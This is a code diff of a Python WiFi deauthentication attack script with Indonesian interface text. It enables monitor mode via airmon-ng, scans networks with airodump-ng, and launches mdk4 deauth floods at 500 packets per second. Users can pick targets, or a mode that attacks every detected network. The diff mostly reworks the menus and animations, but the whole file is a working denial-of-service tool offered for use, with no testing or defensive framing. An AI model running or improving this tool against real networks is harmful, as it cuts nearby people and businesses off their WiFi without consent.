@@ -9,63 +9,115 @@ import sys
 import tempfile
 import time
 
-GREEN = "\033[92m"
-RED = "\033[91m"
-CYAN = "\033[96m"
-MAGENTA = "\033[95m"
-YELLOW = "\033[93m"
+from xforg3 import clear_screen
+
+# ---------- ANSI ----------
 RESET = "\033[0m"
 BOLD = "\033[1m"
+CLEAR = "\033[2J\033[H"
 
-GLITCH_CHARS = "!@#$%^&*<>/\\|~?01"
-GLITCH_COLORS = [GREEN, RED, CYAN, MAGENTA, YELLOW]
+COLORS = {
+    "green": "\033[92m",
+    "red": "\033[91m",
+    "cyan": "\033[96m",
+    "yellow": "\033[93m",
+    "magenta": "\033[35m",
+    "gray": "\033[90m",
+}
 
+GREEN = COLORS["green"]
+RED = COLORS["red"]
+CYAN = COLORS["cyan"]
+YELLOW = COLORS["yellow"]
+MAGENTA = COLORS["magenta"]
+GRAY = COLORS["gray"]
 
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
+BOX_WIDTH = 40
 
+# ================= DRAW BOX =================
 
-def glitch_text(text):
-    return f"{BOLD}{random.choice(GLITCH_COLORS)}{text}{RESET}"
+def draw_box_top(color=CYAN):
+    print(f"\n  {color}{BOLD}╔{'═' * BOX_WIDTH}╗{RESET}")
 
+def draw_box_bottom(color=CYAN):
+    print(f"  {color}{BOLD}╚{'═' * BOX_WIDTH}╝{RESET}")
 
-def glitch_print(text, delay=0.02, rounds=8):
-    n = len(text)
-    settled = [False] * n
+def draw_box_title(title: str, color=CYAN, text_color=YELLOW):
+    inner = f" {title}"
+    pad = BOX_WIDTH - len(inner)
+    if pad < 0:
+        inner = inner[:BOX_WIDTH]
+        pad = 0
+    print(
+        f"  {color}{BOLD}║{RESET}"
+        f"{text_color}{BOLD}{inner}{RESET}"
+        f"{' ' * pad}"
+        f"{color}{BOLD}║{RESET}"
+    )
 
-    for r in range(rounds):
-        settle_ratio = (r + 1) / rounds
-        line = ""
-        for i, c in enumerate(text):
-            if c == " ":
-                line += " "
-                continue
+# ================= LOADING =================
 
-            if settled[i]:
-                line += f"{GREEN}{c}{RESET}"
-                continue
-
-            if random.random() < settle_ratio * 0.5:
-                settled[i] = True
-                line += f"{GREEN}{c}{RESET}"
-            else:
-                glitch_char = random.choice(GLITCH_CHARS)
-                color = random.choice(GLITCH_COLORS)
-                line += f"{color}{glitch_char}{RESET}"
-
-        sys.stdout.write("\r" + line + "\033[K")
+def loading(text, duration=1):
+    """Tampilkan loading dengan animasi spinner"""
+    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+    for i in range(duration * 10):
+        sys.stdout.write(f"\r  {YELLOW}{BOLD}{chars[i % len(chars)]} {text}{RESET}")
         sys.stdout.flush()
-        time.sleep(delay)
-
-    for _ in range(2):
-        flash = f"{BOLD}{random.choice(GLITCH_COLORS)}{text}{RESET}"
-        sys.stdout.write("\r" + flash + "\033[K")
-        sys.stdout.flush()
-        time.sleep(0.05)
-
-    sys.stdout.write("\r" + f"{GREEN}{text}{RESET}" + "\033[K" + "\n")
+        time.sleep(0.1)
+    sys.stdout.write("\r" + " " * 60 + "\r")
     sys.stdout.flush()
 
+def loading_with_text(text, duration=2):
+    """Loading dengan efek berubah-ubah"""
+    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+    glitch_chars = "!@#$%^&*"
+    
+    for i in range(duration * 10):
+        # Random glitch effect pada text
+        display_text = ""
+        for char in text:
+            if char == " ":
+                display_text += " "
+            elif random.random() < 0.1:
+                display_text += random.choice(glitch_chars)
+            else:
+                display_text += char
+                
+        sys.stdout.write(f"\r  {CYAN}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}{display_text}{RESET}")
+        sys.stdout.flush()
+        time.sleep(0.1)
+    sys.stdout.write("\r" + " " * 60 + "\r")
+    sys.stdout.flush()
+
+# ================= GLITCH FUNCTIONS =================
+
+def glitch_print(text, color=GREEN, cycles=8):
+    """Animasi glitch sederhana"""
+    chars = "!@#$%^&*<>/\\|~?"
+    n = len(text)
+    revealed = [False] * n
+    
+    for c in range(cycles):
+        display = []
+        for i, ch in enumerate(text):
+            if ch == " ":
+                display.append(" ")
+                continue
+            if revealed[i]:
+                display.append(ch)
+            else:
+                if random.random() < (c / cycles):
+                    revealed[i] = True
+                    display.append(ch)
+                else:
+                    display.append(random.choice(chars))
+        sys.stdout.write(f"\r  {color}{''.join(display)}{RESET}")
+        sys.stdout.flush()
+        time.sleep(0.04)
+    
+    print(f"\r  {color}{text}{RESET}")
+
+# ================= WIRELESS FUNCTIONS =================
 
 def get_wireless_interfaces():
     output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout
@@ -78,7 +130,6 @@ def get_wireless_interfaces():
                 continue
             interfaces.append(name)
     return interfaces
-
 
 def get_monitor_interface_name(adapter, output):
     current_ifaces = get_wireless_interfaces()
@@ -107,46 +158,27 @@ def get_monitor_interface_name(adapter, output):
 
     return f"{adapter}mon"
 
-
-def run_command(cmd, description=None, show_output=True):
-    if description:
-        print(f"\n{CYAN}>{description}{RESET}")
-
-    if show_output:
-        print(" ".join(cmd))
-
+def run_command(cmd, show_output=False):
     result = subprocess.run(cmd, capture_output=True, text=True)
-    if show_output:
-        if result.stdout:
-            print(result.stdout.strip())
-        if result.stderr:
-            print(result.stderr.strip())
-
     if result.returncode != 0:
-        print(f"{RED}Perintah gagal: {' '.join(cmd)}{RESET}")
         return None
     return result
 
-
 def start_monitor_mode(adapter):
-    glitch_print(f"ACTIVATING MONITOR MODE ON {adapter}...")
-    run_command(["sudo", "airmon-ng", "check", "kill"], "MEMBERSIHKAN PROSES PENGANGGU", show_output=False)
-    result = run_command(["sudo", "airmon-ng", "start", adapter], "MONITOR MODE AKTIF", show_output=False)
-    print("")
+    loading_with_text(f"Mengaktifkan monitor mode pada {adapter}...", 2)
+    run_command(["sudo", "airmon-ng", "check", "kill"], show_output=False)
+    result = run_command(["sudo", "airmon-ng", "start", adapter], show_output=False)
+    
     if result is None:
         return adapter
 
     output = (result.stdout or "") + (result.stderr or "")
     monitor_iface = get_monitor_interface_name(adapter, output)
-    time.sleep(1)
-    print(glitch_text(f"> Interface monitor aktif: {monitor_iface}"))
-    print()
+    time.sleep(0.3)
     return monitor_iface
 
-
 def scan_networks(adapter, duration=10):
-    clear_screen()
-    glitch_print("SCANNING WIFI NETWORKS...")
+    loading_with_text("Scanning WiFi networks...", 2)
     
     temp_dir = tempfile.mkdtemp(prefix="airodump-", dir="/tmp")
     prefix = os.path.join(temp_dir, "scan")
@@ -155,6 +187,22 @@ def scan_networks(adapter, duration=10):
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
     )
+
+    # Tampilkan loading selama scan
+    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+    start_time = time.time()
+    while proc.poll() is None:
+        elapsed = int(time.time() - start_time)
+        remaining = max(0, duration - elapsed)
+        for i in range(5):
+            sys.stdout.write(f"\r  {CYAN}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}Scanning... {remaining}s remaining{RESET}")
+            sys.stdout.flush()
+            time.sleep(0.1)
+            if proc.poll() is not None:
+                break
+    
+    sys.stdout.write("\r" + " " * 60 + "\r")
+    sys.stdout.flush()
 
     try:
         time.sleep(duration)
@@ -198,9 +246,8 @@ def scan_networks(adapter, duration=10):
 
     return networks
 
-
 def stop_monitor_mode(monitor_iface):
-    clear_screen()
+    loading("Membersihkan monitor mode...", 1)
     
     candidates = [monitor_iface]
     if monitor_iface.endswith("mon"):
@@ -209,23 +256,15 @@ def stop_monitor_mode(monitor_iface):
         candidates.append(f"{monitor_iface}mon")
 
     for name in candidates:
-        result = run_command(["sudo", "airmon-ng", "stop", name], None, show_output=False)
+        result = run_command(["sudo", "airmon-ng", "stop", name], show_output=False)
         if result is not None:
             break
 
-    run_command(["sudo", "systemctl", "restart", "NetworkManager"], None, show_output=False)
-    clear_screen()
+    run_command(["sudo", "systemctl", "restart", "NetworkManager"], show_output=False)
 
+# ================= PARSE FUNCTIONS =================
 
 def parse_target_selection(choice_str, total_targets):
-    """
-    Parsing input selection untuk multiple target
-    Mendukung format:
-    - "2" -> target nomor 2
-    - "2 3 5" -> target 2, 3, dan 5
-    - "2-5" -> target 2, 3, 4, 5
-    - "1,3,5-7" -> kombinasi semua format
-    """
     if not choice_str.strip():
         return []
     
@@ -237,7 +276,6 @@ def parse_target_selection(choice_str, total_targets):
             continue
             
         if '-' in part:
-            # Range selection (e.g., "2-5")
             try:
                 start, end = part.split('-')
                 start_num = int(start.strip())
@@ -250,7 +288,6 @@ def parse_target_selection(choice_str, total_targets):
             except ValueError:
                 continue
         else:
-            # Single selection
             try:
                 num = int(part.strip())
                 if 1 <= num <= total_targets:
@@ -260,193 +297,187 @@ def parse_target_selection(choice_str, total_targets):
     
     return sorted(selected)
 
+# ================= SELECT FUNCTIONS =================
 
-def select_targets(networks):
-    """Memilih multiple target WiFi dengan berbagai format input"""
-    if not networks:
-        print("Ga ada jaringan yang ketemu.")
-        return None
-
-    print(f"\n{BOLD}Pilih target WiFi (bisa pilih banyak):{RESET}")
-    print(f"{YELLOW}Format: 1 3 5  atau  2-5  atau  1,3,5-7  atau  kombinasi{RESET}")
-    print()
+def select_interface():
+    clear_screen()
+    draw_box_top(CYAN)
+    draw_box_title("DEAUTH ATTACK", CYAN, YELLOW)
+    draw_box_bottom(CYAN)
     
-    header = f"{'No':<3} {'ESSID':<20} {'CH':<3} {'BSSID'}"
-    print(header)
-    print("-" * len(header))
-    for idx, net in enumerate(networks, start=1):
-        essid = net["essid"][:20]
-        print(f"{GREEN}{idx:<3}{RESET} {essid:<20} {net['channel']:<3} {net['bssid']}")
+    loading("Scanning interfaces...", 1)
+    ifaces = get_wireless_interfaces()
+    if not ifaces:
+        print(f"\n  {RED}[✗] Tidak ada interface ditemukan.{RESET}")
+        sys.exit(1)
+
+    print(f"\n  {BOLD}Pilih interface:{RESET}")
+    for idx, name in enumerate(ifaces, start=1):
+        print(f"  {GREEN}{idx}.{RESET} {name}")
 
     while True:
-        choice = input("\nNomor target (pisahkan dengan spasi/koma, contoh: 2 3 5): ").strip()
+        choice = input(f"\n  {YELLOW}>> nomor : {RESET}").strip()
+        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
+            selected = ifaces[int(choice) - 1]
+            glitch_print(f"LOCKED: {selected}", CYAN)
+            time.sleep(0.3)
+            return selected
+        print(f"  {RED}[!] Input salah, coba lagi.{RESET}")
+
+def select_targets(networks):
+    if not networks:
+        print(f"\n  {RED}[✗] Tidak ada jaringan ditemukan.{RESET}")
+        return None
+
+    clear_screen()
+    draw_box_top(CYAN)
+    draw_box_title("PILIH TARGET", CYAN, YELLOW)
+    draw_box_bottom(CYAN)
+
+    print(f"\n  {YELLOW}Format: 1 3 5  atau  2-5  atau  1,3,5-7{RESET}\n")
+
+    header = f"{'No':<3} {'ESSID':<25} {'CH':<3} {'BSSID'}"
+    print(f"  {header}")
+    print(f"  {YELLOW}{'=' * 55}{RESET}")
+    for idx, net in enumerate(networks, start=1):
+        essid = net["essid"][:25]
+        print(f"  {GREEN}{idx:<3}{RESET} {essid:<25} {net['channel']:<3} {net['bssid']}")
+
+    while True:
+        choice = input(f"\n  {YELLOW}>> nomor target : {RESET}").strip()
         
         if not choice:
-            print("Input tidak boleh kosong, coba lagi.")
+            print(f"  {RED}[!] Input tidak boleh kosong.{RESET}")
             continue
         
         selected_indices = parse_target_selection(choice, len(networks))
         
         if not selected_indices:
-            print("Input salah atau tidak ada target valid, coba lagi.")
+            print(f"  {RED}[!] Input salah atau tidak ada target valid.{RESET}")
             continue
         
         selected_targets = [networks[idx - 1] for idx in selected_indices]
         
-        print(f"\n{GREEN}✓ Terpilih {len(selected_targets)} target:{RESET}")
+        print(f"\n  {GREEN}[✓] Terpilih {len(selected_targets)} target:{RESET}")
         for target in selected_targets:
-            print(f"  - {target['essid']} | CH {target['channel']} | BSSID {target['bssid']}")
+            print(f"  - {target['essid']} | CH {target['channel']} | {target['bssid']}")
         
-        confirm = input(f"\n{YELLOW}Lanjutkan serangan ke semua target? (y/n): {RESET}").strip().lower()
+        confirm = input(f"\n  {YELLOW}Lanjutkan? (y/n): {RESET}").strip().lower()
         if confirm in ['y', 'yes', '']:
-            glitch_print(f"TARGET LOCKED: {len(selected_targets)} targets selected")
+            glitch_print(f"TARGET LOCKED: {len(selected_targets)} targets", GREEN)
             return selected_targets
         else:
-            print("Mengulang pemilihan target...\n")
+            print(f"  {YELLOW}Mengulang pemilihan...{RESET}\n")
             continue
 
-
 def select_attack_mode():
-    print(f"\n{BOLD}Pilih mode serangan:{RESET}")
-    print(f"{GREEN}1.{RESET} Target spesifik (pilih target sendiri)")
-    print(f"{GREEN}2.{RESET} Semua target (serang semua jaringan yang terdeteksi)")
+    clear_screen()
+    draw_box_top(CYAN)
+    draw_box_title("MODE SERANGAN", CYAN, YELLOW)
+    draw_box_bottom(CYAN)
+    
+    print(f"\n  {BOLD}Pilih mode serangan:{RESET}")
+    print(f"  {GREEN}1.{RESET} Target spesifik (pilih target sendiri)")
+    print(f"  {GREEN}2.{RESET} Semua target (serang semua jaringan)")
 
     while True:
-        choice = input("\nNomor mode [1-2]: ").strip()
+        choice = input(f"\n  {YELLOW}>> pilih [1-2] : {RESET}").strip()
         if choice == "1":
             return "target"
         if choice == "2":
             return "all"
-        print("Input salah, pilih 1 atau 2.")
+        print(f"  {RED}[!] Pilih 1 atau 2.{RESET}")
 
+# ================= MDK4 FUNCTIONS =================
 
 def run_deauth_mdk4(targets, monitor_iface):
-    """
-    Menjalankan MDK4 untuk multiple target dengan MODE OP
-    - Packet Rate tinggi (-s 500): Super agresif
-    - Channel Hopping (-c h): Serang semua channel
-    - Multiple target via file (-B)
-    """
     if not targets:
-        print(f"{RED}Tidak ada target untuk diserang.{RESET}")
+        print(f"\n  {RED}[✗] Tidak ada target.{RESET}")
         return
     
-    # Siapkan file target untuk MDK4
     target_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
     try:
         for target in targets:
-            # Format: BSSID,channel
             target_file.write(f"{target['bssid']},{target['channel']}\n")
         target_file.close()
         
-        # Tampilkan target yang akan diserang
-        print(f"\n{CYAN}{BOLD}▶ Memulai serangan MDK4 OP ke {len(targets)} target...{RESET}")
-        print(f"{YELLOW}Target yang diserang:{RESET}")
+        clear_screen()
+        draw_box_top(RED)
+        draw_box_title("🔥 MDK4 OP MODE 🔥", RED, YELLOW)
+        draw_box_bottom(RED)
+        
+        print(f"\n  {CYAN}[*] Menyerang {len(targets)} target...{RESET}")
         for target in targets:
             print(f"  - {target['essid']} | CH {target['channel']} | {target['bssid']}")
         
-        # Base command dengan semua fitur OP (tanpa -f karena gak support)
         mdk4_cmd = [
-            "sudo",
-            "mdk4",
-            monitor_iface,
-            "d",                # Deauth mode
-            "-B", target_file.name,  # Target list file
-            "-c", "h",          # High speed channel hopping
-            "-s", "500"         # 500 packets per second - Agresif!
+            "sudo", "mdk4", monitor_iface, "d",
+            "-B", target_file.name,
+            "-c", "h",
+            "-s", "500"
         ]
         
-        print(f"\n{RED}{BOLD}🔥 MODE OP AKTIF! 🔥{RESET}")
-        print(f"{CYAN}✓ Packet Rate: 500 packets/detik (super agresif){RESET}")
-        print(f"{CYAN}✓ Channel Hopping: AKTIF{RESET}")
-        print(f"{YELLOW}⚠ MDK4 versi ini tidak support MAC Spoofing (-f){RESET}")
+        print(f"\n  {YELLOW}[!] Packet Rate: 500 packets/detik{RESET}")
+        print(f"  {YELLOW}[!] Channel Hopping: AKTIF{RESET}")
+        print(f"\n  {CYAN}Command: {' '.join(mdk4_cmd)}{RESET}")
+        print(f"\n  {GRAY}[!] Tekan Ctrl+C untuk menghentikan{RESET}\n")
         
-        print(f"\n{YELLOW}Menjalankan MDK4...{RESET}")
-        print(f"{CYAN}{' '.join(mdk4_cmd)}{RESET}")
-        print(f"{YELLOW}Tekan Ctrl+C untuk menghentikan serangan{RESET}")
-        print(f"{YELLOW}MDK4 akan menyerang semua target secara simultan!{RESET}\n")
-        
-        # Jalankan MDK4
         proc = subprocess.Popen(mdk4_cmd)
         
         try:
             proc.wait()
         except KeyboardInterrupt:
-            print(f"\n{YELLOW}Menghentikan MDK4...{RESET}")
+            print(f"\n  {YELLOW}[!] Menghentikan MDK4...{RESET}")
             proc.terminate()
             try:
                 proc.wait(timeout=5)
             except subprocess.TimeoutExpired:
                 proc.kill()
                 proc.wait()
-            print(f"{GREEN}✓ Serangan MDK4 dihentikan.{RESET}")
+            print(f"  {GREEN}[✓] Serangan dihentikan.{RESET}")
+            time.sleep(0.5)
             
     finally:
-        # Bersihkan file temporary
         try:
             os.unlink(target_file.name)
         except OSError:
             pass
 
-
 def run_deauth_all_mdk4(monitor_iface):
-    """
-    Menjalankan MDK4 untuk semua target dengan MODE OP
-    - Packet Rate tinggi (-s 500): Super agresif
-    - Channel Hopping (-c h): Serang semua channel
-    """
-    print(f"\n{CYAN}{BOLD}▶ Memulai serangan MDK4 OP ke SEMUA target...{RESET}")
-    print(f"{YELLOW}MDK4 akan menyerang semua jaringan yang terdeteksi!{RESET}")
+    clear_screen()
+    draw_box_top(RED)
+    draw_box_title("🔥 MDK4 OP MODE - ALL TARGETS 🔥", RED, YELLOW)
+    draw_box_bottom(RED)
+    
+    print(f"\n  {YELLOW}[!] Menyerang SEMUA jaringan yang terdeteksi!{RESET}")
     
     mdk4_cmd = [
-        "sudo",
-        "mdk4",
-        monitor_iface,
-        "d",            # Deauth mode
-        "-c", "h",      # High speed channel hopping
-        "-s", "500"     # 500 packets per second - Agresif!
+        "sudo", "mdk4", monitor_iface, "d",
+        "-c", "h",
+        "-s", "500"
     ]
     
-    print(f"\n{RED}{BOLD}🔥 MODE OP AKTIF! 🔥{RESET}")
-    print(f"{CYAN}✓ Packet Rate: 500 packets/detik (super agresif){RESET}")
-    print(f"{CYAN}✓ Channel Hopping: AKTIF{RESET}")
-    print(f"{YELLOW}⚠ MDK4 versi ini tidak support MAC Spoofing (-f){RESET}")
-    
-    print(f"\n{YELLOW}Menjalankan MDK4...{RESET}")
-    print(f"{CYAN}{' '.join(mdk4_cmd)}{RESET}")
-    print(f"{YELLOW}Tekan Ctrl+C untuk menghentikan serangan{RESET}\n")
+    print(f"\n  {CYAN}[*] Packet Rate: 500 packets/detik{RESET}")
+    print(f"  {CYAN}[*] Channel Hopping: AKTIF{RESET}")
+    print(f"\n  {CYAN}Command: {' '.join(mdk4_cmd)}{RESET}")
+    print(f"\n  {GRAY}[!] Tekan Ctrl+C untuk menghentikan{RESET}\n")
     
     proc = subprocess.Popen(mdk4_cmd)
     
     try:
         proc.wait()
     except KeyboardInterrupt:
-        print(f"\n{YELLOW}Menghentikan MDK4...{RESET}")
+        print(f"\n  {YELLOW}[!] Menghentikan MDK4...{RESET}")
         proc.terminate()
         try:
             proc.wait(timeout=5)
         except subprocess.TimeoutExpired:
             proc.kill()
             proc.wait()
-        print(f"{GREEN}✓ Serangan MDK4 dihentikan.{RESET}")
+        print(f"  {GREEN}[✓] Serangan dihentikan.{RESET}")
+        time.sleep(0.5)
 
-
-def prompt_keyboard_interrupt_action():
-    print(f"\n{YELLOW}Keyboard interrupt diterima.{RESET}")
-    print(f"{GREEN}1.{RESET} Pilih target lagi")
-    print(f"{GREEN}2.{RESET} Kembali ke menu")
-    print(f"{GREEN}3.{RESET} Keluar")
-
-    while True:
-        choice = input("\nPilih opsi [1-3]: ").strip()
-        if choice == "1":
-            return "restart"
-        if choice == "2":
-            return "menu"
-        if choice == "3":
-            return "exit"
-        print("Input salah, pilih 1, 2, atau 3.")
-
+# ================= BACK FUNCTIONS =================
 
 def back_to_menu():
     menu_path = os.path.join(os.path.dirname(__file__), "deauth-menu.py")
@@ -454,85 +485,55 @@ def back_to_menu():
         menu_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "deauth-menu.py"))
     os.execvp(sys.executable, [sys.executable, menu_path])
 
-
-def select_interface():
-    glitch_print("SCANNING INTERFACES...")
-    ifaces = get_wireless_interfaces()
-    if not ifaces:
-        print("Ga ada interface ditemukan.")
-        sys.exit(1)
-
-    print(f"\n{BOLD}Pilih interface:{RESET}")
-    for idx, name in enumerate(ifaces, start=1):
-        print(f"{GREEN}{idx}.{RESET} {name}")
-
-    while True:
-        choice = input("\nNomor: ").strip()
-        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
-            selected = ifaces[int(choice) - 1]
-            glitch_print(f"LOCKED: {selected}")
-            clear_screen()
-            return selected
-        print("Input salah, coba lagi.")
-
+# ================= MAIN =================
 
 def main():
     adapter = None
     monitor_iface = None
 
-    while True:
-        try:
-            if monitor_iface is None:
-                adapter = select_interface()
-                monitor_iface = start_monitor_mode(adapter)
-
+    try:
+        adapter = select_interface()
+        monitor_iface = start_monitor_mode(adapter)
+        
+        attack_mode = select_attack_mode()
+        
+        if attack_mode == "target":
             clear_screen()
+            draw_box_top(CYAN)
+            draw_box_title("SCAN WIFI", CYAN, YELLOW)
+            draw_box_bottom(CYAN)
             
-            # Pilih mode serangan
-            attack_mode = select_attack_mode()
+            print(f"\n  {YELLOW}Mau scan berapa detik? (default 10){RESET}")
+            scan_input = input(f"  {YELLOW}>> detik : {RESET}").strip()
             
-            if attack_mode == "target":
-                # Mode target spesifik dengan multiple selection
-                print(f"{CYAN}{BOLD}[?]{RESET} Mau scan WiFi berapa detik?")
-                scan_input = input(f"{YELLOW}>> detik (default 10): {RESET}").strip()
-                
-                if scan_input.isdigit() and int(scan_input) > 0:
-                    scan_duration = int(scan_input)
-                else:
-                    scan_duration = 10
-                
-                networks = scan_networks(monitor_iface, duration=scan_duration)
-                targets = select_targets(networks)
-                
-                if targets is None or not targets:
-                    print("\nTidak ada target terpilih, kembali ke awal.")
-                    continue
-                
-                # Jalankan serangan MDK4 OP untuk target yang dipilih
-                run_deauth_mdk4(targets, monitor_iface)
+            if scan_input.isdigit() and int(scan_input) > 0:
+                scan_duration = int(scan_input)
             else:
-                # Mode semua target dengan OP
-                run_deauth_all_mdk4(monitor_iface)
+                scan_duration = 10
             
-            # Setelah serangan selesai, stop monitor mode
+            networks = scan_networks(monitor_iface, duration=scan_duration)
+            targets = select_targets(networks)
+            
+            if targets is None or not targets:
+                print(f"\n  {RED}[✗] Tidak ada target.{RESET}")
+                stop_monitor_mode(monitor_iface)
+                return
+            
+            run_deauth_mdk4(targets, monitor_iface)
+        else:
+            run_deauth_all_mdk4(monitor_iface)
+        
+        stop_monitor_mode(monitor_iface)
+        
+        print(f"\n  {YELLOW}[!] Tekan Enter untuk kembali...{RESET}")
+        input()
+        back_to_menu()
+
+    except KeyboardInterrupt:
+        print(f"\n\n  {YELLOW}[!] Dibatalkan oleh user{RESET}")
+        if monitor_iface:
             stop_monitor_mode(monitor_iface)
-            break
-
-        except KeyboardInterrupt:
-            action = prompt_keyboard_interrupt_action()
-            if action == "restart":
-                print("\nMengulang ke pemilihan target...")
-                continue
-            if action == "menu":
-                if monitor_iface:
-                    stop_monitor_mode(monitor_iface)
-                back_to_menu()
-            if action == "exit":
-                if monitor_iface:
-                    stop_monitor_mode(monitor_iface)
-                clear_screen()
-                sys.exit(0)
-
+        back_to_menu()
 
 if __name__ == "__main__":
     main()
